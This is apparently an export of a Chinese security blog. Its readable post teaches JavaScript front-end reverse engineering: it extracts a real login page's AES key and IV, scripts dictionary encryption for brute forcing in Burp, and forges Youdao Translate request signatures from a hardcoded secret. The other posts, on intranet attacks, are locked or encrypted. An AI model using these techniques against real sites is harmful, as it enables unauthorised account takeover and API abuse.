[{"id":"d000c68c0537d4a38f7fe3b7716c4e6d","title":"浅析JS前端逆向","content":"声明文章首发于合天网安实验室https://mp.weixin.qq.com/s/uwjSWtItFn2_Wfi570ThlQ\n前言js逆向一直没有相关了解，虽然目前渗透遇见的不是很多，大多数遇见的要么不加密，要么无法实现其加密流程，不过最近看到了一个较为简单的站点正好能够逆向出来，就做了简单记录。本文旨在介绍js逆向的一些基础思路，希望能对初学js前端逆向的师傅有所帮助。\nJS定位在我们寻找JS源代码时，如果直接翻看全部的js文件以来寻找自己想要的一部分，无疑是复杂繁琐的，且工作量巨大，有点类似大海捞针，因此这里我们需要借助一些巧妙的办法来快速定位某标签的js语句，具体方法如下。\n元素审查定位当我们不确定某处的js文件位置时，可以使用F12，点击元素审查，然后点击登录处，观察事件监听器\n\n此时可以观察到login.js文件出现，接下来就可以去对应文件下继续深入。\n\n发现check函数，寻找check函数\n\n此时发现加密是secret函数，再继续跟secert函数就可以了解其整体流程。\n全局搜索法像我们常见的登录框，他们要提交的加密参数一般名为password，或者加密为Crypto加密，因此我们可以全局搜索此类关键字，进而寻找我们需要找的关键加密js语句，进而实现js逆向。\n具体操作也很简单，这里简单举个例子。\n首先打开F12，随便点击一个元素，而后ctrl+shift+f，接下来全局搜索关键词即可\n\n此时含关键词的语句映入眼帘，像一些css文件中的直接略过即可，而后即可找到真正生成密码的地方\n\n接下来便可以深入secret，了解加密方法。\nOnclick定位像一些登录点是存在着onclick属性的，如若该属性值是js函数，那么就极有可能是我们要寻找的js加密函数，而后进行寻找相关函数即可。\n注:图参考自cony1大师傅。\n以cony1大师傅的图为例进行简单讲解\n\n这里发现ssologin函数，接下来寻找该函数\n\n此时即可发现相关js语句。\n实战某登录站点js逆向找到一个登录站点，随意输入\n\n发现用户名和密码均被加密，接下来ctrl+shift+f，全局搜索password字段，寻找加密点\n\n第一个这里明显是输入框的password，且是注释，肯定不是这里，接着寻找，后来到\n\n整体代码如下\nfunction check() &#123;\n    //这里将用户名，密码加密\n    var code = 'letu@levle';\n    var yname = $(\"#yname\").val();\n    if (yname == '') &#123;\n        alert(\"用户名不能为空\");\n        return false;\n    &#125; else &#123;\n        var newName = secret(yname, code, false);\n        $(\"#xname\").val(newName);\n    &#125;\n\n    var ypassword = $(\"#ypassword\").val();\n    if (ypassword == '') &#123;\n        alert(\"密码不能为空\");\n        return false;\n    &#125; else &#123;\n        var newPassword = secret(ypassword, code, false);\n        $(\"#xpassword\").val(newPassword);\n    &#125;\n&#125;\n\n可以看出js代码逻辑并不难，首先提取出ypassword标签下的内容，而后验证其是否为空，若不为空，则对其进行secret函数处理，很明显，这个secret函数就是加密函数，所以我们接下来跟进此加密函数\n\n这里直接给出了iv和key，所以接下来打断点调试就行了，而后打上断点\n\n接下来开始随便输入密码提交，而后来到调试界面\n选中code.substring(16)得到keyf3991777154f4bd0\n\n选中code.substring(0,16)得到偏移量ace43e65106a77f6\n\n下方也给出了Padding和mode分别是Pkcs7和CBC，所以接下来直接解密即可，在网络中我们可以看到提交后加密的账密\n\n拿去随便找个AES解密网站\n\n与所输入的进行比对\n\n成功得到正确结果\n接下来编写脚本即可，直接将字典的内容全部进行加密，而后放入burp进行爆破\nimport base64\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import MD5\nfrom Crypto.Util.Padding import pad\n\n#填入AES的key和iv\nkey = 'f3991777154f4bd0'\niv = 'ace43e65106a77f6'\n\ndef AES_Encrypt(data):\n    global key\n    global iv\n    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv.encode('utf-8'))\n    paddingdata = pad(data.encode('utf-8'),AES.block_size)\n    encrypted = cipher.encrypt(paddingdata)\n    #print(base64.b64encode(encrypted).decode())\n    return base64.b64encode(encrypted).decode()\n\npassword = []\nwith open('password.txt','r',encoding='utf-8') as f:\n    for i in f:\n        password.append(i.strip())\nwith open('password_aes.txt','w',encoding='utf-8') as w:\n    for i in password:\n        data = AES_Encrypt(i)+'\\n'\n        w.write(data)\n\n\n数据长度明显与错误时不一致，不过这里也未成功进入后台，有二次验证，Google验证码无从下手，故点到为止。\n某道js逆向\n接下来进行抓包\n\n这里我们首先注意一下每次不同点在哪，以此为入口点来进行下去，因此我们多次刷新界面抓包，同样的参数观察包的参数哪个值是不同的\n\n从上图可以看出sign和mysticTime是变化的，因此接下来针对这两个变量进行深入，如果我们能够控制这两个变量，那么我们就可以实现直接脚本请求得到翻译对应的语句。\n所以接下来首先从sign开始，我们首先进行F12，而后输入ctrl+shift+f全局搜索关键词\n\n这里可以发现出现了js中含有sign关键字的，但像这个inpage.js他明显不是我们要找的js语句，因此继续往下寻找(输入sign:更容易找到对应函数)。这里我们找到如下语句\n\n相关代码如下\nconst u = \"fanyideskweb\"\n              , d = \"webfanyi\"\n              , m = \"client,mysticTime,product\"\n              , p = \"1.0.0\"\n              , g = \"web\"\n              , b = \"fanyi.web\"\n              , A = 1\n              , h = 1\n              , f = 1\n              , v = \"wifi\"\n              , O = 0;\n            function y(e) &#123;\n                return c.a.createHash(\"md5\").update(e).digest()\n            &#125;\n            function j(e) &#123;\n                return c.a.createHash(\"md5\").update(e.toString()).digest(\"hex\")\n            &#125;\n            function k(e, t) &#123;\n                return j(`client=$&#123;u&#125;&amp;mysticTime=$&#123;e&#125;&amp;product=$&#123;d&#125;&amp;key=$&#123;t&#125;`)\n            &#125;\n            function E(e, t) &#123;\n                const o = (new Date).getTime();\n                return &#123;\n                    sign: k(o, e),\n                    client: u,\n                    product: d,\n                    appVersion: p,\n                    vendor: g,\n                    pointParam: m,\n                    mysticTime: o,\n                    keyfrom: b,\n                    mid: A,\n                    screen: h,\n                    model: f,\n                    network: v,\n                    abtest: O,\n                    yduuid: t || \"abcdefg\"\n                &#125;\n            &#125;\n\n这里可以看到sign是由函数k构成的，同时注意到这里也给出了k的参数，k是由client=fanyideskweb&amp;mysticTime=$&#123;e&#125;&amp;product=webfanyi&amp;key=$&#123;t&#125;所组成的，此时再看函数E，o是时间戳，e这里未知，这时候该怎么办呢，先看看他是不是固定值，当自己不确定在哪下断点调试时，就在附近的几个可疑点都打下断点，观察e的值即可\n经观察，这里的e值是固定的，即fsdsogkndfokasodnaso，此时k(o,e)中的参数我们都了解了，但我们注意到k函数中是有j在外包裹的，因此我们需要对j函数进行相关了解\nfunction j(e) &#123;\n                return c.a.createHash(\"md5\").update(e.toString()).digest(\"hex\")\n            &#125;\n\n明显的md5加密，因此到这里也就都清楚了。\n当我们进行请求时，首先获取当前的时间戳，此作为参数之一，同时与client等参数值组合，进行md5加密，就组成了sign的值。对于mysticTime这个参数，我们从k函数也了解到它其实就是时间戳，因此两个变化的参数到目前就都了解其生成过程了。\n接下来尝试写python脚本\nimport hashlib\nimport time\nimport requests\n\nrequests.packages.urllib3.disable_warnings()\nheaders = &#123;\"Content-Length\": \"312\",\n\"Pragma\": \"no-cache\",\n\"Cache-Control\": \"no-cache\",\n\"Sec-Ch-Ua\": \"\\\"Google Chrome\\\";v=\\\"119\\\", \\\"Chromium\\\";v=\\\"119\\\", \\\"Not?A_Brand\\\";v=\\\"24\\\"\",\n\"Accept\": \"application/json, text/plain, */*\",\n\"Content-Type\": \"application/x-www-form-urlencoded\",\n\"Sec-Ch-Ua-Mobile\":\"?0\",\n\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\",\n\"Sec-Ch-Ua-Platform\": \"\\\"Windows\\\"\",\n\"Origin\": \"https://fanyi.youdao.com\",\n\"Sec-Fetch-Site\": \"same-site\",\n\"Sec-Fetch-Mode\": \"cors\",\n\"Sec-Fetch-Dest\": \"empty\",\n\"Referer\": \"https://fanyi.youdao.com/\",\n\"Accept-Encoding\": \"gzip, deflate\",\n&#125;\nCookie = &#123;\n\"OUTFOX_SEARCH_USER_ID\":\"239978291@10.130.108.41\",\n\"OUTFOX_SEARCH_USER_ID_NCOO\":\"520521807.43848985\"\n&#125;\nurl = \"\"\nword = input(\"请输入翻译内容:\")\nlocaltime = str(int(time.time() * 1000))\ncanshu = \"client=fanyideskweb&amp;mysticTime=&#123;&#125;&amp;product=webfanyi&amp;key=fsdsogkndfokasodnaso\".format(localtime)\nsign = hashlib.md5(canshu.encode(encoding='utf8')).hexdigest()\ndata = &#123;\n    \"i\": f\"&#123;word&#125;\",\n    \"from\": \"auto\",\n    \"to\": \"\",\n    \"dictResult\": \"true\",\n    \"keyid\": \"webfanyi\",\n    \"sign\": sign,\n    \"client\": \"fanyideskweb\",\n    \"product\": \"webfanyi\",\n    \"appVersion\": \"1.0.0\",\n    \"vendor\": \"web\",\n    \"pointParam\": \"client,mysticTime,product\",\n    \"mysticTime\": localtime,\n    \"keyfrom\": \"fanyi.web\"\n&#125;\nres = requests.post(url=url,headers=headers,cookies=Cookie,data=data,verify=False)\nprint(res.text)\n\n\n\n\n此时便得到了加密数据，解密同理，不再阐述。\n参考https://www.freebuf.com/articles/web/381666.html\nhttps://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/\nhttps://www.cnblogs.com/wxd501/p/17070184.html\n","slug":"浅析JS前端逆向","date":"2023-11-28T16:20:30.000Z","categories_index":"前端逆向","tags_index":"JS","author_index":"quan9i"},{"id":"72bf6b540e0d547f829840c591e595f8","title":"内网渗透 | Kerberos协议及其部分攻击手法","content":"\n  \n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"Kerberos协议浅析","date":"2023-11-21T13:19:34.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"0e9d1bb6e46bb7063621fff9492a0f83","title":"内网渗透|横向常见利用手法","content":"\n  \n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"内网横向","date":"2023-11-13T06:08:34.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"b8ca4164abfc3f460c8a00c924b548fd","title":"内网渗透|如何进行权限维持","content":"\n  \n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"内网权限维持","date":"2023-11-09T06:08:34.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"c2243dfcc1e92746688885810a35d9e9","title":"内网渗透|如何在内网中提升权限","content":"\n  \n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"内网权限提升","date":"2023-10-18T13:30:34.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"002712540e7d62913692626e59866a05","title":"内网渗透|内网隐藏隧道搭建","content":"\n  780cf0cc332a020e95e1fb72441b207585c88930c24e933554e9328496cc4ead53a32218c8e435331c1d3cd986c27223f7791998edeafa04179b730715c4a2c400b6bd38752d8119ff4b5e2e611a1b6d4aafd603fe4392dc33035cc403f51756ab2b9ee3aea5585d65e54645e3ecc5e3fd871aae3938315df7d5e4f789ec4d91190a41c426d0421a12269a8d3a2ca17f370248734645d170acf489ebbba007bc82345dbe99e66685f3f28f6c3fe8cd468b6e39f23b5563b90f94165967b4408180082031d5c9657b0e551a393b133d2cc34e2d035ce44307d2421335a50bd3dd36b4b276b6dad9896c41f327da73acba2c582422042940d9da3f139e7c5ddeaf1b159a5721e399a815ea1ad6920f4653c505bed928e3719b645aa8a8ba90fa0a12e3fe48eaf5eed4b1a999bc24da412cb5d9b12c21c6929b966f8ce0b8e427f00d35e068e32e6d31894448075f576bccca7b823e1744118a88c22cb1674a84e4ed3968af07c0adee4dbb53ddbfdc713a1c9bc120bacac77d3e521eabaaa011eebe7197eade1c1f2f4bb7856b330ec0d8dce51069b95df4079e41cb4daf2b719bbe6ea568db87a7b5ec07c8c428d125cc4c2579aa0f81b98fc08322a338d63608af8c63a8ef90b8df788c54b5d9f9ae973dda8cd25bd07dcb1420b3d666c68b90646f8892aff7b6fa683f913f03a616ec86e1cabeaca7f08de1e71c89cc06d57f9f437df255783082f2007c293eea9955ba0ad6e89279a64d371c9363d813deb64d4fce7cdb15f5bfffbc329282dfcbcb9aa43552f3bdcafd9edcf7401e0ab6c023645d4559f873c85a1517553199fc2af7624ffd1ec77ebff0a8c69854378dc1cb693dd4c4acc21464f2c1c11d52424ae62a3c44774f7ae914d22061bfdf4162d7b97a2c3c8fcf3b3f21361512addf67ea0cf803105486ba077f180b0e86ab9307108c0590324a95b56a1b2127d0b2a07b04d720dffb541ba77f467f5721692ec35f2bb1e0fbb8b7d62a74e8e449d68f97f76f8aed958264a9d7453c27304d3a0e0024b4432688bd328bbe5ed6d5cbc23e060a0244b8e4d223118bcf5131185f6f3376324492ceba264a6fc54a693f755df368996e46956247138f27373e4924342d7c5b1a758f9aab7513d06419427f48143f886f9d22c10251e2509b1a66fb0e3f5b90f61893d164168318cf9727dcc84700c0a12b551d6b291d30dadc17ae509aafae63b02f45931db1e895f6f4c3a64038c7c610d1eb8fa83adcab75d479c265b04282ca3d3b482af37d332cea3e2d07ddefcd59184b0cb6fb20be3631549a9678d747ca1c050775abea9a1b7a6a248c01f9ac4d0045992830ef1a57a9901b6b993fca5d27516e0984089d551492eff6bfa507cff255fdbcd56333dba24777c111baf5df1111214323612a67bbe59dfff69541886cc931a89464d7bae507bd1079b0c9b255502dc106aed3361481e7c43fa7c600127bd88fdf90d7a0acd38d3a7b60481555ec62cefc3c9ef6e2cbbd1a7671096a2691387d7169aba29e0bf9c45b38db02d3bda67cbaa021271617ff9ebfc38bf2a2ccfa124483097ca759e7c6a608216a859b9c5100f36c3da75643a2c09284e8e1e2312d540d02cafdc0632bd01da112dfc2614853d6b4c8208f3844224b19345c48bd4e69a1e0bc4efe73e17fb6ee38a3d80c4eff48e9afee857e5e3cfaa31e71d28bde5c476a9a4e571fc41285fa3fd67e0666f6993019c421de3674687ec28d3b7f8c275ecc6d2927daef6fd4cc1246a60fc242be3d0f3a79b8ca410bb09f8d24af0b1cb9e1f625952ed353a598707283131d32635653031819a966654860210b1bde3004dfe4b563a904637b8790d3243daca3a26bbab3bac2fa5e877e1fd2a2eed09b431e513854c710ec77a60e85c39a871756abe58d8568e3217d9c807ae7b6d478a51cca31ff0c92481cd1530b677e26537fde958d2974adcfa7579fb9fc8e3d135ee895a3d16b701ef2c8403873bb122c629fed29bc75b5578a81bde073314f271de50eb2d70e502006e58b4a361dcc7f6dff97091b16a4e11fe82067c5ad0366556b44283284377d71a8c5623022ba1d3d6bafaec6889e1eaeeb44e4d812218cf82c638b917bbdfb32f5d5497980bb2503ab232fb6a0ede0e5f132c5575605150a302df966b802ee1f473ccb8474e3175b69424e3813d234d45f8d43420b776a32664399d243429200a9d9202cea5b3ac5f88e60b8665f86da20db812048001e78f65033ece1a47f720220158b0d1458fedc3ef1c5a66b2124762477cff2e964f8b71fc54bca7e833812902ad7a09ae926ac363f549b9a6dd3c857e052a5bc10f0fde7a27c74dae9d699bf5eacd18e85dcded5072de2a014908f99504093651411b413bc7a9766675a77259ea066052353be3bd6e94dc96241d81a0e7d2244f50f5930cb82f46c07a180692b8f870b316346e08f2484a448be6af05d3ad444d48a1a6a31a042a93606a89697072c6bd4093b557d3669c7cb8f7fe9add533c9a64e80b9c252a7b58ae0fd15fd0e82957ea04c575cda4cbaff4d86e96f52ac8ffa0b00aad4bacb1e4e00c84f732f9dd365568598a90b80c01293b9c8759d2b1a66b714e2a148931bd4782186c2d34a4007350d53724275ee81bd3518691ae4c7bbd27dc335b8c0453650711ca77012fcbe4006a778677d2db4daa6c6ae0d8973329ac6f2a70fad4339df2800cb7e29c2ad7872a92da627292f26ccc6bdd040336e87a5677c1cc1ac5e81c4502f0bc4987964fd0d004fabafbf5eef9d732df614c2859116ca238155be7acda617565aed880664fbb7354260231ce18a5de6d0507692c05297e10126d4db5a32bfa8398f62c9c6b6225e231a07a1960aeca67a9c190c0a0cf32cba1681148a3d639f049296c5ccd675a4521f6996fc945f71892fc44c049670249e81acc271e215b2d3cbe9c83057decf740d9ba460488d61807ef9a44bd821ca43d05ebcb2d0e52abe8d7c818d4b92cf0f24bd2bc78c2b6149575a1c7afba52412206ef360729ad9874823dcc21c713d3364a0c6cc31cfed7a0c953f5e004e4800731eaa29406ca96e7eb743e2398e507acd2fa3d88232795b93cd7e48eb2bf117ffa5708d23af8210e75eece2c2b756580700f1cdc4e5528959a0b4e177ecbe3cbab9662a8555f8f4b51d00fa5e0eb9036786d9323a3af9d0ec7e1d14794d448e00e69ce66e25f5c9fa8bfefad975ea3c147845c0adc007152d9ab1fe1825e367a55a11be2d8dc847308c62b4d856018c4b770cc1d5b03c85b0175979658f659c1550b739a1544a370663ec0a8d65cc22b619bf86254cbdf4f0f5c2f35862b752a508c759a6bfa3762181a595777414ca7f9e48dd55b0df90116b993b965ce3cf2b43275838fed39d565512f31d2f48c37cb9111126cf5b018a512abced8e187e1d2c57dad92e495bd799e2b6b0d3eb8aaee35d1506a4719df43260525d4284a38c1b5025dde8ae4f4ac5f0044da5092dc994cdc522c931381cf02fc1890946497c45d86af36f7ce79d87b3d373caeca603eb2b644e7962c0df46b76063e6597180850b66b7ca2fddbf65b59dd209a477ed16df504c64a6a7521f25db619cfc87ef7d8f27ff549210be8ce1f111342bbc6fa98a8e416b32e7ad2a45845f0ece9fdad2dc39f9c145bf9566e7b63b0702d0f2e4b158f93775899838a1be3ca2145a229a1d2268844b347665f96dfb2ac3d26367df3756e10ae71a7d71a81fcf3f5915cc21ea2e699cc20ffad20facff9261ba2f94daa3ca3320b4d9b68324cf34c72296749e7b5bfd787590cc1ea7cdc62f8bd88571d6bdae40cf1fda2aa52ff736521ecf5132a6fe8aa16617b8e908656f870bd83eacef59d6c6cc515cdc1359a84e63daae90a4d5ad57e785d4b3630d5f8a36be2751e4b51688a1f4fa1853c9710d4e90c26e86e046d650b206fa930167b3a6ad48556f0e2607d1a72860651a579686b86c0de714aa77c788d896d98de31fe57b0ba37508b83d08b29c405b363f65182d17101bcd155931e7b1a3f2a6fec60b47a998e77a41ca4d8c69a82de4870b71cfa3e8edaf66302908e06aa0416f589ac5934a25094a8912b446cfa231acd71cae432b7de6712382058778880f4bf3f6dcac2cf969a5cf639e81f88703bae8c00d941faa990fbdc66c49cec343a5fc4a0753132d2ac8a3d96ea5086765c84fb95b8269dd8fdfa76c704fa17ef3d95768e07155f001d9421fa96e77d57a61d8f60c13aeea861c9663520b34f9389913d3a82e2547a2900b15692c47e39c0436fc2c74913bcfbf451dd778d6a543ba384f934f28ad4512df904ef1c3a07efae1703e43913b54c449d714c75d036323a7bb6d19c74aee2dbea5e7021e8e6a26b024a7e5d5c109ea052ccaa225fdc1e36181ba1cafe305afff55fbac694d8abe403e6f27870e9d7a5fe3f9046f649c5c0f1e9b0f5a22e58c0622823610cb01f6e9a44f1a8db9569a34b431525a4fde2b86c320a33dc90931785e73edf5abfbb40c0ca9e7fc697cd5d05f72a647524400bf282980250fc53e2114cdb85a2eef2ea532ca8e2268b9a7db16c6db757fceb1c069ea032fd06a6933dc0ba311ce938dc61af024fe942b954188488ee6b516f585fd38baa4451ffae71d16c52ffb1171a798241f85211ea42d984c6376eddca7649918550a84c1e8994c475c9b7958629ccf268b5fee26c8e96d9da815a9f7b887364e728723b4f8f7b51855d81a99c52b9cfe79f67124de0eba8b96775ee8c9351bc89ce350a192431b0e7607c19b6bcac754538d35ce613edc0f5d0c08bd39d71b2e21faa8a14f1f6a5ef3a9a533774f48aac1f50e1b4f3942cd2ad5f5306f5d439a6b97a8c165108925acd9f6a22e8f847044589e0eb9b7d01b4352a923d840da92588fef07398065ee3f05e3800154f67b5be45e671745fceaceadd20c1149c17b0d97b39904edc3a70437b36b6109b93c440737fd0bef305658fc8e01687d074c4f87d730e6436d5a11691b7cfeaa9acaad5e3cb930081aad5265a9a9b9fd21370a00b5e690631e7b7909045ee640c2872ab915df248b0b96ef2fc3208293417004e0648eafc18bc9046722da16294686ab2bb5014513da73929e20cf6f8a3c1268b068c5ed3f47902a050f6840d455c7bb044465edf5614661eec48bee1c0b02a0142666ff7fc241789dd53b00372dcca02a6ec78b0b62ed0c23a49892496d9f20c9668448017892dad44404f11a570b2c84c8ad1870389054c85d2379b272647e216404b96700d0d83dad32ea7fe0e6021abbb2c87bfac74184055aebd58a06130e1c900150d4f78a63b8ed53b1f942e7523d0969aa99c5c1f6ee372ed1b2cf784313e1c8707eac7808d32b1fd834d76305e2c021dc54fc1bf16eb494ca2e85aff95c09bc863c734f01760ef21b71bf736362c410ffcfd7bc917d7c71a6e39b7cd3585c23b45b683c455faa306617d574dfd19ad737c5e87cc2bc3d7e5fe41f8f6ef4e92da27542889fa99e7dcf22318e859949218e565e5e0a6dc6cd6fb9b90f3be9d2ed723ab6fecdfbfb2e79d535ef0e832bf54692f2e53890e77f4ad187895c916ae525c0e8db8f48985aa7706d37629095eeb14277f8c9efde91d75b217f418eda85fde3e56e040086612734c36f524d6b82264491e65230b40d8b44ff143fe2b94f8a5ac7426070db663fc040f443243fc5150226fadc221ed375786bf3ff8e10644e563a53b8ae398da159a4635e5e6acfa8c4ee8819c0400980715c0695b131a7decf8b20459ca26828130a93264aaa6ebcd716c1aa27f1f461e32b0dfea9f036e679865481983d85751ec4459ab38868ca7ef4a4bd1686059b8ae845f9ab3e85da7b09e67e3debc843e9ef8be0dedb789f57f42b397f31adfac3bc0b23741587bf39b407bf2c69107a2bd79eff965bf8277beaabbfd3f4a4cb41a27fc67f1b013c746227f73b05911b08822652661e8791602dfb7eb5d159c1f1a10a170a38940003017fff26d519a26a776b4d2a6223467645d1aa4db8f1192cc6ba5c21e59190625cab3a69ffd543478a749ee06e82d8631c90838897e7bb975fd5325c1144f75b80d0b88300600a140991203ad8fe224d52c54d7a1ae487e866ca5d0914c817a8a2cb5cbe3a4909d478016bbdc3368e9e02baa52b64477cfa3904cf9dc4534c0c00f5066538936defe4f4a152b31c9472d86774c82da0fc35f1c7db2880a9384b95812a91442d1c6aa0f05156c4e143b9f6a55fd98448c48a7374b622b6d3cab4e3cb80427a0f60c17d98c27481360c3b46e4c563dfa79174b0360cdaa002b4e8f9bd999038ed4e5bab984bbb2a0a0534788b1b07882003e2c4700b38d91aa840b931b50b8c49e4c96aea3e5e333871775aaf843b2b4cb72e0ec87b93c12497272445ab5976aac730bd49f4acfbbd80510b11ebfd89c9120a76286219c8f5ac8c21fbc27a51e3d346f47e23e1632b7a9521ac8e2e97bc5ae5a1a6f7e83b2ccf8445321248056abf9090451dbeec5c024cc16fe94056a1e51bfc935997b92d21b5d6def632d7e4172bd79b1440efca87ee2af2e4c1d71a909de277afbcd9b52c575d669a15ddd06e3d9400c3b2811ae5a3bc71e4b0579a51ef03fc4ca72ae783be4fe6419d8af5ee890d8b1ba08ed672f775a5fbe6183cc2f9247ccec023f6b22993d2013068a29590f20f3c3d4b4852b84ed07c861fa840660e14b43c40345509ddc59c65460ac119f524195ba52ba4dbd8e4288e371da870af30716109b822de2f8571f89cc3682457959f88393b0254620e4978dd3dc9ee0054c05e4c186f01abe111bf7325e9e537c8214a890d2327d6045ad2180fcdbf6edf77d79ffbacda4d3082ab19d1bfdc5393e4770e499c3744ddf5edc3859d0e7e57350e66a50b7ba07940eb3297692a4bfffe371754de5bdd0f17efce0bf7c343e59932bf97cfd7dd0012e468b29ead5fbab131b5bf360be1df3b60268d0e12fe815814a72add38b74b6292b83ae5a2bee4bc2e19c78ab8a25a6d95b21d3b01b4fb4688cb032b1a070b012074ff574589c072b098df2f21a63c1be71851b013ff05a771f6ef2e860a1d34398cfc9e78959e8364f085d5822484df046af29075333f2da7128e0e76f2b4857c97895a3fab4be8e036389eca73c8ed5596ea829e97338545182d3611802a97e20bed574837f78422318c9862f2ff1847f238f2e5bc0819dc4caef172b825da437924fd64a71f6fd7741430dd4f2526eca2717f5ed2313fd18de3d27f8cddad61b5987e7b42322cf4bb910306b8f6544ee65b67cd2d409abd944df28c61c573f3b8285858ba096e72fb7c90a81aae1f594253028d847822eb06a7ca1cdcdf4b7d83913978b36f0f7d21593559debdb4f46b71e4fe40ad4db65af07d7307d11721e6bca40ae03d1906f75ea1fe8c621cf2256af9a86911cb1873956429d67f0b339e1e25776ecdc8481bec06afe27bfe6b47fccac9d0490040c474e83078f9e7d8437fa3ea26bee4c6b53efc9fdbd433867e1033708ae0920175a70f5c7b16459766de0ab9d37283f576121f5ce1bec07c0d2dacbbbd676fe67252e77500cb74f40587e4b24f6743fe70b5112a0ce7e47418931e1989612c66cae77a1d7e42063eb348a08b26d056e59f19edb50dc39b161461df05d55371785ab311e9c30177dbca69db90718e410d1a97802a51a7c35c3b6abe336ed173ea1e83a01e2f8b11d0cf24d2fd805d064e43b56252b2a35992fb39f4d4e053e89cf431e4af61a940c56b272fe225b6c23e735b3541e4f1c27ad5005cf47c0f74f2aaa28ad50a5531578eb4b186d707f6af3d60de40b6ce494a6c3dde3aac20e03e4d239b7b08d033b49a7b91d73e3fc36ad7cb8ed04202f15ca2df47d97e69da05beca74b461910b7ab3145cc3268ff772398e09047c38cdb5119141e2118f3ce9ffe2594770a1e6a99c50aaee6cb7188556767a6eee63f3199aaf93f28096ebe767f2dc1ef588f04710d4eb845e6630c4391f381912b023c52428b6a5aa6a945eb9d5cf654b2c9b3ddbed34042cd7b387dc50638a553f2845b06403e4dd9a5f939115060d3f649e8b607ecd10035a295928d91d8a4407d61daf459b1f1d311e789ae373385ad52475ddf326ad7971c81a8834aea762393740e4c56e23147818dc55526cd0497efc9b68cce9d13d6273749dd343773a97ab6ebb600ba6906c1d11f41d9206c2e1c8e68d682fe3857b4c279eecf186dc708d08e982beec9b8de7c1126d132915450ee23d87e271858080a75135a30b9c9d40ba43b3ed6a6ad367916362f438018e9f8df6e91bf8d5eee684c24eae0cf3c4468e3ea4431fa8e52a163f87cc9b3efc6716938853ac45429108aedd0fd6a0802cda1930c667516218c0b79b7779bd416dbfc0890b72ad07cc6e9e9f6816eabb0d73ac9ef87bfa4ea042cdf7fcaba32340a5fe348fdd8ca1a8999a280bba9600048d072de8331f0374151143f1fb8ddc4ab5635c384515c9ab1658b6c851805d209b7d2f196be6f26a41a7d4cbd8e34cdfc95d733bbb9fee35a639372efefa6e33a74df7ab281f072cb0eadf4b0910ecaa32a02a51c5caa10fac18280b42c3f7dfe31f249426d24527bfe9a525418c1e47842a07bcaa2d7e52479ba0c4849941abc1842ff2e86119662f4b300dc204944087d7f3421ea77baf7cc8b8bb4e61d8473f10003361d9d2fb7fcb82bfc31a888539374fb7c71f8416abdd48ec18cde701ad6643ff76aeb5e49eda282aa5dddf0be9c95390cfae23084d22d50c3e3fc50474ddd9f4d53400135429c1822a8a56f9672507b58ce79da6ed52a0d00b95871abe8791f7e2696e0132e575893adb13d62f78d3be06596b756452f9d4f9d88dc750a89f909668502bd9071fd6a0ec5652e769c13be1213e8fc834bbe41d3a87557e9e1507b603e14db768c2d40df9e88cd2f9316adac16b9c73ebbb9a92b2df4e26861f2c8167b350a3196f68082cfe388534a0e52982a9ffc586718e45f60797cf24083229465080e9a83ea0db17708003bae1e28f1fc63ba796175343e0c62e595dd4b17bbc5b84116dbd993e04d451624061699d92c67bfb52bbc9a76273a377230461146a4044b23e1069b0dfff350000530225136c43c10efb9b30449a6b0ad823dfca38126fd82ae956aa4f9b0dad33799a06f3dc9328afbcf996577a416b03d0e97b83657c8c0b16545157a1bf61c5d5926b44e37376d4404a8acb7e20e2d8e304fdbeab9fd66c4801d4ca94ec30f843bfa92a11ad2b49ec7a0da2a11a3a6b6767bddca0deabd53e44cc07a2a54c7a5bf6f1d446f50ead2edce56339dc55dabf46c892aeb6a44e76064dcfe01025b4fcb45a3ef1c275f16258e3c28696db090a92aaf96e4b0a4b505d4eb4e0b16dc389a8cb8c2618bc4c2793d0401597e3f3d4ab416582de61788f07b3200060b47830b3614cf73ff97827c5cb87a661787172de4e722dd7ca0b8b8c957fafe8b6c32c4c92dd38d0f7a090b04ef5a6607ea9069e9791716eea1dc2283ca43e928a5170632d2e92bcb9e7d7b4dff462af461240754ab5685fa7a8d1b829660bd37906eedaea44268f0972d1fced9fe1110f6efda577fe6b6a7d48782e8fb0abd390bf06d5d6a81630d4ed97138740b0604d6f640517e3c33309e7bd5cff9efabf6285dba3841c719e10e636761e0998965160c410866b6306801dc84c043c44931b985867077a2341405950cf16722128acc6562509455d9a396d07cbe5aa0f8c4a2ecfabd5cef59e366ea11f23dd912aa75592226def3e778a5a9594233be0f20cf6ce2a5bcd606a43f20d03941afdb735d63d9467c9e12047bb80336f967e0216fd0fd5cd4ca979dc3124581d7bbe5f500a65e89704bff20f5f35adf491626e6b5cd9b9061333026d57c327fe6eda0a2446a4b01345b1fadae5e926cde05a55c04935e42f78b0a3bfa24befadd82e5fe98c96e5fafac8d02d05351b354c381cdbbcce4cd1fbd49d62f7cc0b2793e96b3ca06ef1fc5b899ee614a89739ac92b95445d88f91c6fba4851126ff16e721c97a185c3b01af57fbe1b8c2e32a6a018c0cdf0280f00fbe6a483cc7843a717d7fd57dbfce3ff868f2062107b557d96cc2c3d79fb8290ac96a9f9c18081ab68f80e5c12ec33ca9c2b8df566a25624ae0061670075334baf00a6edda8ab89e5418faff2fda4567ed7d17ace5012333f23777a91becc44ccf5e902604971b3572fbe039df1c1e65aedf859ab8c0650c58f6c246ab5072cbbf768633eaf53286aa4168e6ec961b6db7b9545d0428c574d3d944a37b92401db8ed27262d6dca4ff5121d8ed7ceafee884443967de197fd0ad71b45b32efbd077240b453624e290e1fa8d474d61013d41f32bd82f50e55ca4cd02f110b5629b3993d9eb6d68fc6b49b25f3fa6abbeb966b1a14009662c5a5383236be0a709176ab4cc324147b00fba361e933f7e4321ab7b5191678646865f257791fe31de6f010b91cbb619979f08deec